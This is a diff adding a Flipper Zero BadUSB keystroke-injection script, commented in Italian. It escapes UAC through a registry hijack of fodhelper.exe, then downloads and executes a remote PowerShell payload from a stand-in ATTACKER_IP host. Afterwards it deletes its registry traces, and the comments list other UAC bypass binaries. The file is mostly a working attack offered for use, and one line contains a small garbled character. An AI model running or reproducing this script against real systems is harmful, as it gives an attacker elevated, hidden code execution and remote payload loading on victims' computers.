@@ -1,0 +1,39 @@
+REM ============================================================
+REM Title:    UAC Bypass via FodHelper
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Privilege Escalation
+REM Privs:    User (local admin group, but UAC blocking)
+REM Layout:   IT
+REM Time:     ~6 secondi
+REM Detect:   Medio - registry modification + fodhelper
+REM Desc:     Bypassa UAC usando fodhelper.exe (auto-elevate).
+REM           Modifica una chiave di registro per eseguire un
+REM           comando con privilegi elevati senza prompt UAC.
+REM CHANGE:   Il comando da eseguire come admin
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force|Out-Null;Set-ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(Default)' -Value 'powershell -w hidden -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8080/payload.ps1'')\"' -Force;New-ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecutè -Value '' -Force|Out-Null;Start-Process fodhelper.exe;Start-Sleep 3;Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force"
+ENTER
+
+REM ============================================================
+REM Come funziona:
+REM 1. fodhelper.exe è un binario Microsoft con auto-elevate
+REM 2. Cerca il comando da eseguire in ms-settings\Shell\Open
+REM 3. Noi scriviamo il nostro payload in quella chiave
+REM 4. fodhelper si auto-eleva e esegue il nostro comando
+REM 5. Puliamo la chiave di registro dopo 3 secondi
+REM
+REM Alternative UAC bypass:
+REM - computerdefaults.exe (stesso principio)
+REM - sdclt.exe /kickoffelev
+REM - eventvwr.exe (mmc hijack)
+REM - cmstp.exe (INF file)
+REM
+REM NOTA: Funziona SOLO se l'utente è nel gruppo
+REM Administrators ma UAC blocca l'elevazione automatica.
+REM Non funziona per utenti standard non-admin.
+REM ============================================================
